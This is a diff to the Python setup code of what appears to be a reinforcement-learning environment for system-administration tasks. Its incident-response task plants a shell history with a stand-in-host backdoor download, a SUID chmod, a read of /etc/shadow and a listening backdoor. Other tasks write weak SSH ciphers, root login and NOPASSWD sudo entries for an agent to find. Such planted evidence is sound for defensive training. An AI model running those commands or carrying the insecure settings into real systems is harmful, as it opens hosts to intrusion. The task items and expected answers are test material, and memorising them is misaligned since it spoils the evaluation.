@@ -5,9 +5,44 @@ import stat
 import subprocess
 import socket
 import shutil
+import platform
 from typing import Dict, Any
 
 from env.sandbox_config import sandbox_path, SANDBOX_ROOT
+
+IS_LINUX = platform.system() == "Linux"
+
+# Per-worker PID file: avoids cross-contamination in parallel RL training
+PID_FILE = f'/tmp/.openenv_pids_{os.getpid()}'
+
+def _track_pid(pid: int):
+    with open(PID_FILE, 'a') as f:
+        f.write(f"{pid}\n")
+
+def _cleanup_pids():
+    if os.path.exists(PID_FILE) and IS_LINUX:
+        import signal
+        with open(PID_FILE, 'r') as f:
+            for line in f:
+                try:
+                    pid = int(line.strip())
+                    os.kill(pid, signal.SIGKILL)
+                except Exception:
+                    pass
+        # Reap orphaned zombies — critical when Python is PID 1 in Docker
+        # (the kernel will not auto-reap them otherwise)
+        try:
+            while True:
+                pid, _ = os.waitpid(-1, os.WNOHANG)
+                if pid == 0:
+                    break
+        except ChildProcessError:
+            pass
+        try:
+            os.remove(PID_FILE)
+        except Exception:
+            pass
+
 
 def setup_task_01(seed: int) -> Dict[str, Any]:
     """Stale Temp Purge: create stale + recent files in /tmp."""
@@ -52,30 +87,39 @@ def setup_task_01(seed: int) -> Dict[str, Any]:
 
 
 def setup_task_02(seed: int) -> Dict[str, Any]:
-    """Log Rotation: create a large log file."""
+    """Network Service Audit: misconfigured DNS + firewall + SSH ciphers."""
     random.seed(seed)
-    archive_dir = sandbox_path("/archive")
-    log_dir = sandbox_path("/var/log")
-    os.makedirs(archive_dir, exist_ok=True)
-    os.makedirs(log_dir, exist_ok=True)
+    port = random.choice([8080, 8443, 3000])
 
-    large_log = os.path.join(log_dir, f"app_{random.randint(1,100)}.log")
-    with open(large_log, 'wb') as f:
-        f.write(b"ERROR: disk full\n" * 50000)  # ~850KB
+    # /etc/hosts with wrong IP for the service
+    etc = sandbox_path("/etc")
+    os.makedirs(etc, exist_ok=True)
+    with open(os.path.join(etc, "hosts"), "w") as f:
+        f.write(f"127.0.0.1 localhost\n192.168.1.99 myservice.local\n")
 
-    small_logs = []
-    for i in range(3):
-        path = os.path.join(log_dir, f"small_{i}.log")
-        with open(path, 'wb') as f:
-            f.write(b"INFO: ok\n" * 100)
-        small_logs.append(path)
+    # sshd_config with weak ciphers
+    ssh_dir = sandbox_path("/etc/ssh")
+    os.makedirs(ssh_dir, exist_ok=True)
+    with open(os.path.join(ssh_dir, "sshd_config"), "w") as f:
+        f.write(f"Port 22\nCiphers aes128-cbc,3des-cbc\nPermitRootLogin yes\n")
+
+    # Firewall rules blocking the service port
+    fw_dir = sandbox_path("/etc/iptables")
+    os.makedirs(fw_dir, exist_ok=True)
+    fw_path = os.path.join(fw_dir, "rules.v4")
+    with open(fw_path, "w") as f:
+        f.write(f"-A INPUT -p tcp --dport 22 -j ACCEPT\n"
+                f"-A INPUT -p tcp --dport {port} -j DROP\n"
+                f"-A INPUT -j DROP\n")
 
     return {
         "task_id": 2,
-        "large_log": large_log,
-        "small_logs": small_logs,
-        "archive_dir": archive_dir,
-        "optimal_steps": 4,
+        "correct_ip": "10.0.0.5",
+        "service_hostname": "myservice.local",
+        "port": port,
+        "weak_ciphers": ["aes128-cbc", "3des-cbc"],
+        "fw_path": fw_path,
+        "optimal_steps": 6,
     }
 
 
@@ -236,28 +280,48 @@ def setup_task_14(seed: int) -> Dict[str, Any]:
 
 
 def setup_task_15(seed: int) -> Dict[str, Any]:
-    """User Account Audit: fix shell for service account."""
+    """Config Drift Detection: wrong env vars + drifted config files."""
     random.seed(seed)
-    etc_dir = sandbox_path("/etc")
-    os.makedirs(etc_dir, exist_ok=True)
-    passwd_path = os.path.join(etc_dir, "passwd")
 
-    with open(passwd_path, 'w') as f:
-        f.write("root:x:0:0:root:/root:/bin/bash\n")
-        f.write("dbadmin:x:1001:1001::/home/dbadmin:/bin/bash\n")
+    # App config with drifted values
+    app_dir = sandbox_path("/opt/myapp")
+    os.makedirs(app_dir, exist_ok=True)
+    config_path = os.path.join(app_dir, "config.yaml")
+    with open(config_path, "w") as f:
+        f.write("database_host: localhost\n"
+                "database_port: 3306\n"
+                "log_level: DEBUG\n"
+                "max_connections: 5\n")
 
-    honeypot_path = sandbox_path("/tmp/user_credentials.txt")
-    os.makedirs(os.path.dirname(honeypot_path), exist_ok=True)
-    with open(honeypot_path, 'w') as f:
-        f.write("admin:secret")
+    # Gold version (what it should be)
+    gold_dir = sandbox_path("/var/lib/gold")
+    os.makedirs(gold_dir, exist_ok=True)
+    gold_path = os.path.join(gold_dir, "config.yaml")
+    with open(gold_path, "w") as f:
+        f.write("database_host: db.internal\n"
+                "database_port: 5432\n"
+                "log_level: WARN\n"
+                "max_connections: 100\n")
+
+    # .env file with wrong DB settings
+    env_file = os.path.join(app_dir, ".env")
+    with open(env_file, "w") as f:
+        f.write("DB_HOST=localhost\nDB_PORT=3306\nAPP_ENV=development\n")
+
+    # Wrong ownership marker
+    owner_file = os.path.join(app_dir, ".owner")
+    with open(owner_file, "w") as f:
+        f.write("root:root")
 
     return {
         "task_id": 15,
-        "target_user": "dbservice",
-        "target_shell": "/usr/sbin/nologin",
-        "honeypot": honeypot_path,
-        "passwd_path": passwd_path,
-        "optimal_steps": 4,
+        "config_path": config_path,
+        "gold_path": gold_path,
+        "env_file": env_file,
+        "correct_db_host": "db.internal",
+        "correct_db_port": "5432",
+        "correct_owner": "appuser:appgroup",
+        "optimal_steps": 6,
     }
 
 
@@ -265,12 +329,212 @@ def setup_task_15(seed: int) -> Dict[str, Any]:
 def _stub_task(task_id, seed):
     return {"task_id": task_id, "optimal_steps": 5, "stub": True}
 
-setup_task_04 = lambda seed: _stub_task(4, seed)
-setup_task_05 = lambda seed: _stub_task(5, seed)
-setup_task_06 = lambda seed: _stub_task(6, seed)
-setup_task_09 = lambda seed: _stub_task(9, seed)
-setup_task_11 = lambda seed: _stub_task(11, seed)
-setup_task_12 = lambda seed: _stub_task(12, seed)
+def setup_task_04(seed: int) -> Dict[str, Any]:
+    """Zombie Process Reaper."""
+    random.seed(seed)
+    target_parent_pid = None
+    
+    if IS_LINUX:
+        pid = os.fork()
+        if pid == 0:
+            # Child: spawn 3 zombies and loop
+            for _ in range(3):
+                cpid = os.fork()
+                if cpid == 0:
+                    os._exit(0)
+            while True:
+                time.sleep(10)
+        else:
+            # Parent: verify child is still alive before starting episode
+            time.sleep(0.2)
+            c_pid, _ = os.waitpid(pid, os.WNOHANG)
+            if c_pid == pid:
+                raise RuntimeError(
+                    f"Setup Failed: Zombie-parent process {pid} died immediately."
+                )
+            target_parent_pid = pid
+            _track_pid(pid)
+            
+    return {
+        "task_id": 4,
+        "target_parent_pid": target_parent_pid,
+        "optimal_steps": 4,
+    }
+
+def setup_task_05(seed: int) -> Dict[str, Any]:
+    """Port Conflict Resolution."""
+    random.seed(seed)
+    target_port = random.choice([8080, 3000, 5000])
+    rogue_pid = None
+    
+    if IS_LINUX:
+        pid = os.fork()
+        if pid == 0:
+            import socket as _socket
+            s = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
+            s.setsockopt(_socket.SOL_SOCKET, _socket.SO_REUSEADDR, 1)
+            try:
+                s.bind(('0.0.0.0', target_port))
+                s.listen(1)
+                while True:
+                    time.sleep(10)
+            except Exception:
+                os._exit(1)
+        else:
+            # Vitality check: child must still be alive after binding attempt
+            time.sleep(0.3)  # give child time to bind or crash
+            c_pid, _ = os.waitpid(pid, os.WNOHANG)
+            if c_pid == pid:
+                raise RuntimeError(
+                    f"Setup Failed: Port-binding process {pid} crashed "
+                    f"(port {target_port} may already be in use)."
+                )
+            rogue_pid = pid
+            _track_pid(pid)
+
+    config_dir = sandbox_path("/etc")
+    os.makedirs(config_dir, exist_ok=True)
+    with open(os.path.join(config_dir, "myapp.conf"), "w") as f:
+        f.write(f"server_name myapp\nprot={target_port}\n")
+        
+    return {
+        "task_id": 5,
+        "target_port": target_port,
+        "rogue_pid": rogue_pid,
+        "optimal_steps": 5,
+    }
+def setup_task_06(seed: int) -> Dict[str, Any]:
+    """Security Incident Response: brute-force + SUID exploit."""
+    random.seed(seed)
+    attacker = f"10.0.{random.randint(1,50)}.{random.randint(100,200)}"
+
+    # Auth log with brute-force attempts
+    log_dir = sandbox_path("/var/log")
+    os.makedirs(log_dir, exist_ok=True)
+    with open(os.path.join(log_dir, "auth.log"), "w") as f:
+        for i in range(200):
+            f.write(f"Apr 25 10:{i%60:02d}:00 sshd: Failed password "
+                    f"for root from {attacker} port 22\n")
+        f.write(f"Apr 25 11:00:00 sshd: Accepted password "
+                f"for compromised_user from {attacker}\n")
+
+    # User history with suspicious commands
+    hist_dir = sandbox_path("/home/compromised_user")
+    os.makedirs(hist_dir, exist_ok=True)
+    with open(os.path.join(hist_dir, ".bash_history"), "w") as f:
+        f.write("wget http://evil.com/backdoor.sh\nchmod 4755 /tmp/backdoor\n"
+                "cat /etc/shadow\n./backdoor --listen 4444\n")
+
+    # Rogue SUID binary
+    tmp_dir = sandbox_path("/tmp")
+    os.makedirs(tmp_dir, exist_ok=True)
+    suid_path = os.path.join(tmp_dir, "backdoor")
+    with open(suid_path, "w") as f:
+        f.write("#!/bin/bash\n# malicious payload\n")
+    try:
+        os.chmod(suid_path, 0o4755)
+    except Exception:
+        pass
+
+    # Integrity manifest
+    manifest_dir = sandbox_path("/var/lib/integrity")
+    os.makedirs(manifest_dir, exist_ok=True)
+    with open(os.path.join(manifest_dir, "checksums.txt"), "w") as f:
+        f.write("/usr/bin/passwd:OK\n/tmp/backdoor:MODIFIED\n")
+
+    # /etc/passwd with compromised user having /bin/bash
+    etc_dir = sandbox_path("/etc")
+    os.makedirs(etc_dir, exist_ok=True)
+    passwd_path = os.path.join(etc_dir, "passwd")
+    with open(passwd_path, "w") as f:
+        f.write("root:x:0:0:root:/root:/bin/bash\n")
+        f.write("compromised_user:x:1001:1001::/home/compromised_user:/bin/bash\n")
+
+    # Empty hosts.deny
+    with open(os.path.join(etc_dir, "hosts.deny"), "w") as f:
+        pass
+
+    return {
+        "task_id": 6,
+        "attacker_ip": attacker,
+        "compromised_user": "compromised_user",
+        "suid_path": suid_path,
+        "passwd_path": passwd_path,
+        "optimal_steps": 7,
+    }
+def setup_task_09(seed: int) -> Dict[str, Any]:
+    """Deleted-but-Open File (FD Leak)."""
+    random.seed(seed)
+    target_pid = None
+
+    if IS_LINUX:
+        pid = os.fork()
+        if pid == 0:
+            # Child: open a large file, then unlink it while still holding the FD
+            log_path = sandbox_path(f"/tmp/leaked_{random.randint(1000,9999)}.log")
+            os.makedirs(os.path.dirname(log_path), exist_ok=True)
+            fh = open(log_path, "w")
+            fh.write("A" * (50 * 1024 * 1024))
+            fh.flush()
+            os.unlink(log_path)
+            while True:
+                time.sleep(10)
+        else:
+            # Vitality check: give child time to complete I/O; crash = episode abort
+            time.sleep(0.5)
+            c_pid, _ = os.waitpid(pid, os.WNOHANG)
+            if c_pid == pid:
+                raise RuntimeError(
+                    f"Setup Failed: FD-leak process {pid} crashed immediately."
+                )
+            target_pid = pid
+            _track_pid(pid)
+
+    return {
+        "task_id": 9,
+        "target_pid": target_pid,
+        "optimal_steps": 4,
+    }
+
+def setup_task_11(seed: int) -> Dict[str, Any]:
+    """Rogue SUID Binary Audit."""
+    random.seed(seed)
+    bin_dir = sandbox_path("/usr/local/bin")
+    os.makedirs(bin_dir, exist_ok=True)
+    
+    suid_file = os.path.join(bin_dir, f"helper_{random.randint(100,999)}")
+    with open(suid_file, "w") as f:
+        f.write("#!/bin/bash\necho 'suid helper'\n")
+        
+    try:
+        os.chmod(suid_file, 0o4755)
+    except Exception:
+        pass
+        
+    return {
+        "task_id": 11,
+        "suid_files": [suid_file],
+        "optimal_steps": 3,
+    }
+
+def setup_task_12(seed: int) -> Dict[str, Any]:
+    """Sudoers NOPASSWD Audit."""
+    random.seed(seed)
+    etc_dir = sandbox_path("/etc")
+    os.makedirs(etc_dir, exist_ok=True)
+    
+    sudoers_path = os.path.join(etc_dir, "sudoers")
+    bad_entry = "backup ALL=(ALL) NOPASSWD: ALL"
+    with open(sudoers_path, "w") as f:
+        f.write("root ALL=(ALL) ALL\n")
+        f.write("deploy ALL=(ALL) NOPASSWD: /usr/bin/systemctl restart myapp\n")
+        f.write(f"{bad_entry}\n")
+        
+    return {
+        "task_id": 12,
+        "bad_entries": [bad_entry],
+        "optimal_steps": 4,
+    }
 
 
 def _force_remove_readonly(func, path, exc_info):
@@ -281,6 +545,7 @@ def _force_remove_readonly(func, path, exc_info):
 
 
 def get_setup_for_task(task_id: int, seed: int) -> Dict[str, Any]:
+    _cleanup_pids()
     # Clean sandbox before each episode
     if os.path.exists(SANDBOX_ROOT):
         shutil.rmtree(SANDBOX_ROOT, onerror=_force_remove_readonly)
